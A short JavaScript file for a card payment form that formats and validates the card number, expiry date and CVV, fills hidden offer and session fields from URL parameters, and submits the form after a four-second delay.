document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('paymentForm');
    const cardInput = document.getElementById('cardNumber');
    const expInput = document.getElementById('expiration');
    const cvcInput = document.getElementById('cvc');

    // Populate hidden fields from URL query
    const urlParams = new URLSearchParams(window.location.search);
    document.getElementById("offerid").value = urlParams.get("OfferID") || "";
    document.getElementById("sessionid").value = urlParams.get("SessionID") || "";

    // Format card number as user types and validate
    cardInput.addEventListener('input', () => {
        let value = cardInput.value.replace(/\D/g, "");
        let formatted = value.replace(/(.{4})/g, "$1 ").trim();
        cardInput.value = formatted;

        const cardRegex = /^\d{13,19}$/;
        cardInput.setCustomValidity(
            value.length > 0 && !cardRegex.test(value) ? "Invalid card number" : ""
        );
    });

    // Format expiry date and auto-focus CVV
    expInput.addEventListener('input', () => {
        let value = expInput.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.slice(0, 2) + '/' + value.slice(2, 4);
        }
        expInput.value = value.slice(0, 5);

        if (/^(0[1-9]|1[0-2])\/\d{2}$/.test(expInput.value)) {
            cvcInput.focus();
        }
    });

    // Restrict CVV digits only
    cvcInput.addEventListener('input', () => {
        cvcInput.value = cvcInput.value.replace(/\D/g, '').slice(0, 4);
    });

    // Validate + add 4s delay before submit
    form.addEventListener('submit', (e) => {
        e.preventDefault(); // block instant submit

        const card = cardInput.value.replace(/\s+/g, '');
        const exp = expInput.value;
        const cvc = cvcInput.value;

        const cardRegex = /^\d{13,19}$/;
        const expRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
        const cvcRegex = /^\d{3,4}$/;

        if (!cardRegex.test(card)) {
            alert('Invalid card number');
            cardInput.focus();
            return;
        }
        if (!expRegex.test(exp)) {
            alert('Invalid expiry date');
            expInput.focus();
            return;
        }
        if (!cvcRegex.test(cvc)) {
            alert('Invalid CVV');
            cvcInput.focus();
            return;
        }

        // ✅ Wait 4 seconds before submitting
        setTimeout(() => {
            form.submit();
        }, 4000);
    });
});
